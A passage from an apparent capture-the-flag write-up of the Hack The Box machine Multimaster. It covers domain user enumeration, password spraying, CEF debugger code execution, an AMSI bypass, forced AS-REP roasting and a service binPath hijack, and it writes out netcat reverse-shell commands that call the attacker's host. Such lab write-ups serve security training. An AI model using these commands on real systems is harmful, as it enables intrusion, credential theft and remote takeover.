print("\r" + " " * 50)

```

There were two tricky parts:
- The WAF has some kind of dumb rate limiting. I think it’s looking at requests over some time period and returning 403 if there are too many. I just have a loop that sleeps for 30 seconds and tries again if there’s a 403. The current parameters are to sleep 30 seconds on a 403, and 1 second between requests. It’s possible those could be optimized.
- Getting Python to actually send `\u0027` was tricker than I expected. I originally was doing `json={"name":""}` in the POST, but Python is too nice about formatting that. Changing it to `data` and setting it the way I have above took some trial and error through the proxy.
- Sending through Burp was really nice, and it didn’t really slow anything down since I was already going slow for the WAF.

The script finds new accounts I didn’t previously know about:

```

root@kali# ./get_domain_users.py 
[*] Finding domain
[+] Found domain: MEGACORP
[*] Finding Domain SID
[+] Found SID for MEGACORP domain: 0x0105000000000005150000001c00d1bcd181f1492bdfc236
[+] Found account [00500]  MEGACORP\Administrator                              
[+] Found account [00501]  MEGACORP\Guest                              
[+] Found account [00502]  MEGACORP\krbtgt                              
[+] Found account [00503]  MEGACORP\DefaultAccount                              
[+] Found account [00512]  MEGACORP\Domain Admins                              
[+] Found account [00513]  MEGACORP\Domain Users                              
[+] Found account [00514]  MEGACORP\Domain Guests                              
[+] Found account [00515]  MEGACORP\Domain Computers                              
[+] Found account [00516]  MEGACORP\Domain Controllers                              
[+] Found account [00517]  MEGACORP\Cert Publishers                              
[+] Found account [00518]  MEGACORP\Schema Admins                              
[+] Found account [00519]  MEGACORP\Enterprise Admins                              
[+] Found account [00520]  MEGACORP\Group Policy Creator Owners                              
[+] Found account [00521]  MEGACORP\Read-only Domain Controllers                              
[+] Found account [00522]  MEGACORP\Cloneable Domain Controllers                              
[+] Found account [00525]  MEGACORP\Protected Users                              
[+] Found account [00526]  MEGACORP\Key Admins                              
[+] Found account [00527]  MEGACORP\Enterprise Key Admins                              
[+] Found account [00553]  MEGACORP\RAS and IAS Servers                              
[+] Found account [00571]  MEGACORP\Allowed RODC Password Replication Group                              
[+] Found account [00572]  MEGACORP\Denied RODC Password Replication Group                              
[+] Found account [01000]  MEGACORP\MULTIMASTER$                              
[+] Found account [01101]  MEGACORP\DnsAdmins                              
[+] Found account [01102]  MEGACORP\DnsUpdateProxy                              
[+] Found account [01103]  MEGACORP\svc-nas                              
[+] Found account [01105]  MEGACORP\Privileged IT Accounts                              
[+] Found account [01110]  MEGACORP\tushikikatomo                              
[+] Found account [01111]  MEGACORP\andrew                              
[+] Found account [01112]  MEGACORP\lana                               
[+] Found account [01601]  MEGACORP\alice                              
[+] Found account [01602]  MEGACORP\test                               
[+] Found account [02101]  MEGACORP\dai                                
[+] Found account [02102]  MEGACORP\svc-sql                              
[+] Found account [03101]  MEGACORP\SQLServer2005SQLBrowserUser$MULTIMASTER                              
[+] Found account [03102]  MEGACORP\sbauer                              
[+] Found account [03103]  MEGACORP\okent                              
[+] Found account [03104]  MEGACORP\ckane                              
[+] Found account [03105]  MEGACORP\kpage                              
[+] Found account [03106]  MEGACORP\james                              
[+] Found account [03107]  MEGACORP\cyork                              
[+] Found account [03108]  MEGACORP\rmartin                              
[+] Found account [03109]  MEGACORP\zac                                
[+] Found account [03110]  MEGACORP\jorden                              
[+] Found account [03111]  MEGACORP\alyx                               
[+] Found account [03112]  MEGACORP\ilee                               
[+] Found account [03113]  MEGACORP\nbourne                              
[+] Found account [03114]  MEGACORP\zpowers                              
[+] Found account [03115]  MEGACORP\aldom                              
[+] Found account [03116]  MEGACORP\jsmmons                              
[+] Found account [03117]  MEGACORP\pmartin                              
[+] Found account [03119]  MEGACORP\Developers

```

### Test Passwords with Domain Users

I added all these users to a file and went back to `crackmapexec` to check if the passwords I already have work with any of these users:

```

root@kali# crackmapexec smb 10.10.10.179 -u dom_users -p passwords --continue-on-success
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP) (signing:True) (SMBv1:True)
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\MULTIMASTER$:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\MULTIMASTER$:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\MULTIMASTER$:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\DnsAdmins:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\DnsAdmins:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\DnsAdmins:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\DnsUpdateProxy:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\DnsUpdateProxy:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\DnsUpdateProxy:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\svc-nas:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\svc-nas:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\svc-nas:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\Privileged IT Accounts:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\Privileged IT Accounts:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\Privileged IT Accounts:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\tushikikatomo:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP\tushikikatomo:finance1 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\tushikikatomo:banking1 STATUS_ACCESS_DENIED 
...[snip]...

```

There’s one success: `MEGACORP\tushikikatomo:finance1`.

With these new creds, I have access to three shares:

```

root@kali# crackmapexec smb 10.10.10.179 -u tushikikatomo -p finance1 --shares
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP) (signing:True) (SMBv1:True)
SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP\tushikikatomo:finance1 
SMB         10.10.10.179    445    MULTIMASTER      [+] Enumerated shares
SMB         10.10.10.179    445    MULTIMASTER      Share           Permissions     Remark
SMB         10.10.10.179    445    MULTIMASTER      -----           -----------     ------
SMB         10.10.10.179    445    MULTIMASTER      ADMIN$                          Remote Admin
SMB         10.10.10.179    445    MULTIMASTER      C$                              Default share
SMB         10.10.10.179    445    MULTIMASTER      Development                     
SMB         10.10.10.179    445    MULTIMASTER      dfs             READ            
SMB         10.10.10.179    445    MULTIMASTER      E$                              Default share
SMB         10.10.10.179    445    MULTIMASTER      IPC$                            Remote IPC
SMB         10.10.10.179    445    MULTIMASTER      NETLOGON        READ            Logon server share 
SMB         10.10.10.179    445    MULTIMASTER      SYSVOL          READ            Logon server share

```

### WinRM

I also have access to a shell over WinRM:

```

root@kali# evil-winrm -u "MEGACORP\tushikikatomo" -p finance1 -i 10.10.10.179

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\alcibiades\Documents>

```

And `user.txt`:

```
*Evil-WinRM* PS C:\Users\alcibiades\desktop> type user.txt
8264c025************************

```

## Priv: tushikikatomo –> cyork

### Enumeration

I wanted to check out the web stuff, but this user doesn’t have access to `\inetpub\wwwroot`:

```
*Evil-WinRM* PS C:\inetpub\wwwroot> dir
Access to the path 'C:\inetpub\wwwroot' is denied.
At line:1 char:1
+ dir
+ ~~~
    + CategoryInfo          : PermissionDenied: (C:\inetpub\wwwroot:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

```

After looking around the users home directory, I turned to looking at installed programs, and in enumerating them, one jumped out as not normal on HTB machines:

```
*Evil-WinRM* PS C:\Program Files (x86)\Microsoft Visual Studio 10.0> dir

    Directory: C:\Program Files (x86)\Microsoft Visual Studio 10.0

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/7/2020   7:26 PM                Common7

```

### CEF Debugging Background

[This Tweet](https://twitter.com/taviso/status/1182418347759030272) from Travis Ormandy explains the situation:

> It seems like everyone shipping Electron or CEF has made the mistake of leaving the debugger enabled at some point. I made a tiny command line application you can use to check. 🐞 <https://t.co/BIceqkcYJq>
>
> — Tavis Ormandy (@taviso) [October 10, 2019](https://twitter.com/taviso/status/1182418347759030272?ref_src=twsrc%5Etfw)

```

 <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script> 

```

In the linked [GitHub](https://github.com/taviso/cefdebug), Travis shows how to check for the existence of these sockets, as well as how to get execution using this technique. Visual Studio Code is built on Electron.

### POC

I’ll grab the `.exe` from the releases page, and upload it using my `impacket-smbserver`. Then running it shows the existence of a debug socket:

```
*Evil-WinRM* PS C:\programdata> .\cefdebug.exe
[2020/04/01 03:19:43:2657] U: There are 5 tcp sockets in state listen.
    + CategoryInfo          : NotSpecified: ([2020/04/01 03:...n state listen.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[2020/04/01 03:20:03:7841] U: There were 3 servers that appear to be CEF debuggers.
[2020/04/01 03:20:03:9873] U: ws://127.0.0.1:9102/1243eb8e-cffa-4cae-b922-5fa98b74e779
[2020/04/01 03:20:03:9873] U: ws://127.0.0.1:41509/967dc3c1-4c31-41fc-b9a0-b3dc8a41df33
[2020/04/01 03:20:03:9873] U: ws://127.0.0.1:3090/1fbbbd53-07f7-4e44-8d56-d80a9dc606a7

```

Note, for some reason with this Evil-WinRM shell, it throws those two lines of errors each time I run `cefdebug.exe`. It seems to work fine anyway. Over a `nc` shell, it doesn’t throw those errors. Your mileage may vary. I’ll not show them the rest of the post.

Those sockets only last a few seconds, so I’ll have to act quickly to make use of them. As the socket urls change in the examples I show, each time I ran `cefdebug.exe` with no args to get the current sockets, and then the commands shown.

To show I can run something, I’ll get the version:

```
*Evil-WinRM* PS C:\programdata> .\cefdebug.exe --code "process.version" --url ws://127.0.0.1:14393/5a73a31b-903d-41e8-b18d-9fb422e89234
[2020/04/01 03:24:14:1537] U: >>> process.version
[2020/04/01 03:24:14:1557] U: <<< v10.11.0

```

I can also see who is running with `whoami`. I tried to pick a directory that any user would be able to write to:

```
*Evil-WinRM* PS C:\programdata> .\cefdebug --code "process.mainModule.require('child_process').exec('whoami > C:\windows\system32\spool\drivers\color\0xdf')" --url ws://127.0.0.1:64493/fd4b0ffa-a388-40da-b01a-62709102094b
[2020/04/01 03:28:40:0773] U: >>> process.mainModule.require('child_process').exec('whoami > C:\\windows\system32\spool\drivers\color\0xdf')
[2020/04/01 03:28:40:0930] U: <<< ChildProcess
*Evil-WinRM* PS C:\programdata> type C:\windows\system32\spool\drivers\color\0xdf
megacorp\cyork

```

### Shell

I’ll upload `nc.exe`, as I’m working through the 32-bit Visual Studio Code. Now spawn it:

```
*Evil-WinRM* PS C:\programdata> .\cefdebug --code "process.mainModule.require('child_process').exec('C:\\programdata\\nc.exe 10.10.14.19 443 -e cmd')" --url ws://127.0.0.1:60404/830991c3-0f17-4025-9b2c-a0ef1c8675f2
[2020/04/01 03:39:52:7113] U: >>> process.mainModule.require('child_process').exec('C:\\programdata\\nc.exe 10.10.14.19 443 -e cmd')
[2020/04/01 03:39:52:7153] U: <<< ChildProcess

```

And get a shell:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.179.
Ncat: Connection from 10.10.10.179:50159.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Program Files\Microsoft VS Code>whoami
megacorp\cyork

```

This was super finicky. It just didn’t work sometimes. But eventually it did.

## Priv: cyork –> sbauer

### Enumeration

cyork does have access to the web directory. I missed it the first time I was there, but eventually I noticed a very custom dll in `\inetpub\wwwroot\bin\`:

```

C:\inetpub\wwwroot\bin>dir
 Volume in drive C has no label.
 Volume Serial Number is 5E12-F84E                                                                                
                                                         
 Directory of C:\inetpub\wwwroot\bin
                                                         
01/07/2020  10:28 PM    <DIR>          .
01/07/2020  10:28 PM    <DIR>          ..
02/21/2013  08:13 PM           102,912 Antlr3.Runtime.dll 
02/21/2013  08:13 PM           431,616 Antlr3.Runtime.pdb 
05/24/2018  01:08 AM            40,080 Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll
07/24/2012  11:18 PM            45,416 Microsoft.Web.Infrastructure.dll
01/09/2020  05:13 AM            13,824 MultimasterAPI.dll
01/09/2020  05:13 AM            28,160 MultimasterAPI.pdb 
02/17/2018  09:14 PM           664,576 Newtonsoft.Json.dll
01/07/2020  10:28 PM    <DIR>          roslyn
11/28/2018  12:30 AM           178,808 System.Net.Http.Formatting.dll
11/28/2018  12:28 AM            27,768 System.Web.Cors.dll
01/27/2015  03:34 PM           139,976 System.Web.Helpers.dll
11/28/2018  12:31 AM            39,352 System.Web.Http.Cors.dll
11/28/2018  12:31 AM           455,096 System.Web.Http.dll
01/31/2018  11:49 PM            77,520 System.Web.Http.WebHost.dll
01/27/2015  03:32 PM           566,472 System.Web.Mvc.dll 
02/11/2014  02:56 AM            70,864 System.Web.Optimization.dll
01/27/2015  03:32 PM           272,072 System.Web.Razor.dll
01/27/2015  03:34 PM            41,672 System.Web.WebPages.Deployment.dll
01/27/2015  03:34 PM           211,656 System.Web.WebPages.dll
01/27/2015  03:34 PM            39,624 System.Web.WebPages.Razor.dll
07/17/2013  04:33 AM         1,276,568 WebGrease.dll
              20 File(s)      4,724,032 bytes
               3 Dir(s)  19,370,094,592 bytes free

```

I’ll copy `MultimasterAPI.dll` back to my machine over SMB.

### MultimasterAPI.dll

The file is a .NET binary:

```

root@kali# file MultimasterAPI.dll 
MultimasterAPI.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows

```

But before opening it in DNSpy, I’ll run `strings`. It’s important to remember for Windows binaries to run with and without `-el` to capture the 16 bit character strings. There’s one that jumps out when I run with `-el`:

```

server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;

```

That looks like a database connection string.

### Test Creds

In what’s becoming a theme for this box, I’ll check the creds with `crackmapexec` against my user list to see if it works for any, and it finds one:

```

root@kali# crackmapexec smb 10.10.10.179 -u dom_users -p 'D3veL0pM3nT!' --continue-on-success
...[snip]...
SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP\sbauer:D3veL0pM3nT!
...[snip]...

```

### WinRM

This user can also use WinRM to get a shell:

```

root@kali# evil-winrm -u 'MEGACORP\sbauer' -p 'D3veL0pM3nT!' -i 10.10.10.179

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sbauer\Documents>

```

## Priv: sbauer –> jordan

### Collect Bloodhound

Given this is an active directory environment, it’s time I ran [BloodHound](https://github.com/BloodHoundAD/BloodHound). I’ll copy `SharpHound.exe` into my SMB share and then onto MultiMaster:

```
*Evil-WinRM* PS C:\programdata> copy \\10.10.14.19\share\SharpHound.exe .

```

I’ll use `-c all` for all collections methods, and it creates a `.zip` output file:

```
*Evil-WinRM* PS C:\programdata> .\SharpHound.exe -c all
----------------------------------------------
Initializing SharpHound at 4:35 AM on 4/1/2020
----------------------------------------------

Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container                                                              

[+] Creating Schema map for domain MEGACORP.LOCAL using path CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 19 MB RAM
Status: 94 objects finished (+94 ì)/s -- Using 27 MB RAM
Enumeration finished in 00:00:00.6367272
Compressing data to .\20200401043525_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 4:35 AM on 4/1/2020! Happy Graphing! 

```

I’ll move that back to my box:

```
*Evil-WinRM* PS C:\programdata> move 20200401043525_BloodHound.zip \\10.10.14.19\share\

```

### BloodHound Analysis

Loading that into Bloodhound, I’ll start by bringing up the three accounts I’ve owned and marking them as such (right click and select Mark as Owned). Then I’ll run the query “Shortest Paths to High Value Targets”, and it returns this:

[![image-20200401144617068](https://0xdfimages.gitlab.io/img/image-20200401144617068.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200401144617068.png)

It’s a bit of a mess, but in looking at it, two of the accounts I’ve owned are on there. tushikikatomo is there just because they can PSRemote. But sbauer has GenericWrite on jorden, who is a member of a high priority group, Server Operators. That seems like a valid path.

### Bypass AMSI

Taking advantage of the relationships outlined by BloodHound is most easily done with `PowerView.ps1` from [PowerSploit](https://github.com/PowerShellMafia/PowerSploit). I copy it into my SMB share and onto Multimaster, but when I try to load it, it is rejected by the AV:

```
*Evil-WinRM* PS C:\programdata> copy \\10.10.14.19\share\PowerView.ps1 .                  
*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1                    
At C:\programdata\PowerView.ps1:1 char:1                                                 
+ #requires -version 2                                                                   
+ ~~~~~~~~~~~~~~~~~~~~                                                                   
This script contains malicious content and has been blocked by your antivirus software.  
At C:\programdata\PowerView.ps1:1 char:1                                                 
+ #requires -version 2                                                                   
+ ~~~~~~~~~~~~~~~~~~~~                                                                   
    + CategoryInfo          : ParserError: (:) [], ParseException                        
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent 

```

[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) has an AMSI bypass built in. It’s a bit weird in that you have to run `menu` first, and then the command, or it errors out:

```
*Evil-WinRM* PS C:\programdata> Bypass-4MSI                                              
The term 'Bypass-4MSI' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify th
at the path is correct and try again.
At line:1 char:1
+ Bypass-4MSI
+ ~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Bypass-4MSI:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException 
*Evil-WinRM* PS C:\programdata> menu

   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/ 
              By: CyberVaca, OscarAkaElvis, Laox @Hackplayers  
  
[+] Bypass-4MSI 
[+] Dll-Loader 
[+] Donut-Loader 
[+] Invoke-Binary
*Evil-WinRM* PS C:\programdata> Bypass-4MSI                                               
[+] Patched! :D

```

Once I do that, I can load `PowerView.ps1`:

```
*Evil-WinRM* PS C:\programdata> Import-Module .\PowerView.ps1                             

```

### Get AS-REP Hash

In [Forest](/2020/03/21/htb-forest.html#as-rep-roasting) I used AS-REP Roasting to get a foothold on the machine. Here, because I can edit the attributes for the user, I’m going to enable the `DONT_REQ_PREAUTH` flags on the jorden account, and then get that same hash and crack it.

If I look at what is currently set for the jorden user, it’s the `NORMAL_ACCOUNT` and `DONT_EXPIRE_PASSWORD` flags:

```
*Evil-WinRM* PS C:\programdata> Get-DomainUser jorden | ConvertFrom-UACValue

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

```

For each user, there’s a 4-byte (64-bit) word that represents [various flags for userAccountControl](http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm). The bit for `UF_DONT_REQUIRE_PREAUTH` is 4194304. So I can XOR that bit (flip it to on) with the following command:

```
*Evil-WinRM* PS C:\programdata> Set-DomainObject -Identity jorden -XOR @{useraccountcontrol=4194304} -Verbose
Verbose: [Get-DomainSearcher] search base: LDAP://DC=MEGACORP,DC=LOCAL
Verbose: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=jorden)(name=jorden)(displayname=jorden))))
Verbose: [Set-DomainObject] XORing 'useraccountcontrol' with '4194304' for object 'jorden'
*Evil-WinRM* PS C:\programdata> Get-DomainUser jorden | ConvertFrom-UACValue

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536
DONT_REQ_PREAUTH               4194304

```

Once I flip that, I can get the hash from my Kali machine:

```

root@kali# GetNPUsers.py -no-pass -dc-ip 10.10.10.179 MEGACORP/jorden
Impacket v0.9.21.dev1+20200313.160519.0056b61c - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for jorden
$krb5asrep$23$jorden@MEGACORP:a73d19d63b09964cc6e097172e767f9b$31da65f338ec20aae3fe4c1cede839fdf534fdfa878b6dcd8a0c7acd0453c98b6621d03ab22b38423de129f6de81266ef985eb7d655eb963fcbbc1935dc60bac0dad858b627c469b6a56a30b8e84b682576efbb0896d3ffcee4ae5e41bc621769cb329af2fe3f596828f24349c44c341383352d717f43db48bfde182113102e3b5ed51109ed1b09eb5a97b3afbb0f112abe362ba1de5feef2784743d72759236ce7eac39b3372ac29bd868787ffa9752dea356c93b66522b99ab7019a623e5fdc49fb645792ee5f183697105440966ca027a9060a9a7577ea5bdfc8566e6aea599f9ada7af30997309ca

```

Or I can use a harmj0y tool, [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast). There’s a `.ps1` file in the repo. Copy it to SMB to Multimaster, import it, and run it:

```
*Evil-WinRM* PS C:\programdata> copy \\10.10.14.19\share\ASREPRoast.ps1 .
*Evil-WinRM* PS C:\programdata> . .\ASREPRoast.ps1
*Evil-WinRM* PS C:\programdata> Get-ASREPHash -Domain megacorp.local -Username jorden
$krb5asrep$jorden@MEGACORP.LOCAL:217d8dd459813386d9a7f5f0fa4c3cf1$094bc95da47bee5ef4946e9384e97277961c3069d86a102d4e79b5fed4881db4898d2e1ae38d81fb7327a707a58f771965cad70c3e2f3651e330dd2d85725e343928ae06de4179cee031d580c5c158a55a39bbf4fd3a16f2ec2d1f9377427153e69302d1c6e90cd82f8b4d0ab177c2e370fa051d03480d18dbb52d14c08f79a14cc34257a60e8f2b5af3d8306b26cfc63059f10c5ebf1fde99e9ce6c194132a99769fcacfad6ce01e90764f9df2179ec5f496846f7ae3b5ea307d37aac65cc1e7b91ae4bb1a48bb9adeead8ca5957fb2cb07f1154af572e7ef767cd8e89a834fe5acb0e2218bb4459710ba56e34a5044

```

The hash format that comes out of the second method requires adding `$23` towards the beginning to make it look like the first and work in `hashcat`.

Either way, I’ll set jorden back:

```
*Evil-WinRM* PS C:\programdata> Set-DomainObject -Identity jorden -XOR @{useraccountcontrol=4194304} -Verbose
Verbose: [Get-DomainSearcher] search string: LDAP://MULTIMASTER.MEGACORP.LOCAL/DC=MEGACORP,DC=LOCAL
Verbose: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=jorden)(name=jorden)(displayname=jorden))))
Verbose: [Set-DomainObject] XORing 'useraccountcontrol' with '4194304' for object 'jorden'

```

And verify it no longer works:

```

root@kali# GetNPUsers.py -no-pass -dc-ip 10.10.10.179 MEGACORP/jorden
Impacket v0.9.21.dev1+20200313.160519.0056b61c - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for jorden
[-] User jorden doesn't have UF_DONT_REQUIRE_PREAUTH set

```

### Crack Hash

Now `hashcat` can crack this pretty quickly:

```

root@kali# hashcat -m 18200 jorden.hash /usr/share/wordlists/rockyou.txt --force
...[snip]...
$krb5asrep$23$jorden@MEGACORP.LOCAL:c6e1735f291d71135278005a61a8e78e$771ee4486ddcf18fdf2ee216bf2e66cff076ef6907a1154f3458c7e5ef2f65038263f9ce459cfa964ad0057b53676f4c326e5d380910e
48d9fee2c585819d70cea63442b035359ef6f9cb3a8cfdfffe981c8e7c0aaaf913f9bf8d8df96147b30f15b71e5a9541dcdfcfef20670edfb46b2973917d661fadcc48df2aa9f72c1586a1bbcbff4420f89c4360125f1a9a23
12466f69201ed5035db7952bb6eaa3cec0edf0888e958e0180333ba11fde7e0448836d87fe3090152980a95c1e6c1a151a83603f1380ea7c306cfbd74fdd19a507c36c1d38db5c7231e9fee7bdbe73ad1dedac61c2b1e9d3ef
2e36834206c2130:rainforest786
...[snip]...

```

The password is rainforest786.

### WinRM

The creds work to get a shell as jorden:

```

root@kali# evil-winrm -u "MEGACORP\jorden" -p rainforest786 -i 10.10.10.179

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jorden\Documents> whoami
megacorp\jorden    

```

## Shell as SYSTEM

### Enumeration

jorden is in the Server Operators group:

```
*Evil-WinRM* PS C:\programdata> net user jorden
User name                    jorden
Full Name                    Jorden Mclean
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 5:48:17 PM
Password expires             Never
Password changeable          1/10/2020 5:48:17 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   4/1/2020 12:15:47 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Server Operators
Global Group memberships     *Domain Users         *Developers
The command completed successfully.

```

[Reading about it](http://www.thenetworkencyclopedia.com/entry/server-operators-built-in-group/), by default, this group can:

> - Log on locally to the server console
> - Change the system time
> - Back up files and directories
> - Restore files and directories
> - Shut down the system
> - Force shutdown from a remote system

From [ss64.com](https://ss64.com/nt/syntax-security_groups.html):

> A built-in group that exists only on domain controllers. By default, the group has no members. Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer.

The ability to start and stop services is interesting for sure.

This user has the ability to edit any service. If I run [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS), I can see this more clearly:

```

  [+] Looking if you can modify any service registry()
   [?] Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions
    HKLM\system\currentcontrolset\services\.NET CLR Data (Server Operators [WriteData/CreateFiles GenericWrite])     
    HKLM\system\currentcontrolset\services\.NET CLR Networking (Server Operators [WriteData/CreateFiles GenericWrite])                                                   
    HKLM\system\currentcontrolset\services\.NET CLR Networking 4.0.0.0 (Server Operators [WriteData/CreateFiles GenericWrite])
    HKLM\system\currentcontrolset\services\.NET Data Provider for Oracle (Server Operators [WriteData/CreateFiles GenericWrite])
    HKLM\system\currentcontrolset\services\.NET Data Provider for SqlServer (Server Operators [WriteData/CreateFiles GenericWrite])
    HKLM\system\currentcontrolset\services\.NET Memory Cache 4.0 (Server Operators [WriteData/CreateFiles GenericWrite])                                                
    HKLM\system\currentcontrolset\services\.NETFramework (Server Operators [WriteData/CreateFiles GenericWrite])     
    HKLM\system\currentcontrolset\services\1394ohci (Server Operators [WriteData/CreateFiles GenericWrite])
    HKLM\system\currentcontrolset\services\3ware (Server Operators [WriteData/CreateFiles GenericWrite])
    HKLM\system\currentcontrolset\services\ACPI (Server Operators [WriteData/CreateFiles GenericWrite])
    HKLM\system\currentcontrolset\services\AcpiDev (Server Operators [WriteData/CreateFiles GenericWrite])
    HKLM\system\currentcontrolset\services\acpiex (Server Operators [WriteData/CreateFiles GenericWrite])
    HKLM\system\currentcontrolset\services\acpipagr (Server Operators [WriteData/CreateFiles GenericWrite])
    HKLM\system\currentcontrolset\services\AcpiPmi (Server Operators [WriteData/CreateFiles GenericWrite])
    HKLM\system\currentcontrolset\services\acpitime (Server Operators [WriteData/CreateFiles GenericWrite]) 
...[snip]...

```

### Exploit Service

To get a shell, I’ll upload `nc64.exe`:

```
*Evil-WinRM* PS C:\programdata> upload /opt/shells/netcat/nc64.exe
Info: Uploading /opt/shells/netcat/nc64.exe to C:\programdata\nc64.exe

Data: 60360 bytes of 60360 bytes copied

Info: Upload successful!

```

Now I’ll need to find a service I can stop and start. Took a bit of trial and error, but found `browser`. I’ll change the `binPath`:

```
*Evil-WinRM* PS C:\programdata> sc.exe config browser binPath= "C:\programdata\nc64.exe -e cmd.exe 10.10.14.19 443"
[SC] ChangeServiceConfig SUCCESS

```

Now stop the service, and then start it:

```
*Evil-WinRM* PS C:\programdata> sc.exe stop browser

SERVICE_NAME: browser
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0xafc8
*Evil-WinRM* PS C:\programdata> sc.exe start browser
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

```

It reports that it failed, but that’s because `nc64.exe` isn’t a service binary. At my `nc` listener:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.179.
Ncat: Connection from 10.10.10.179:50019.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

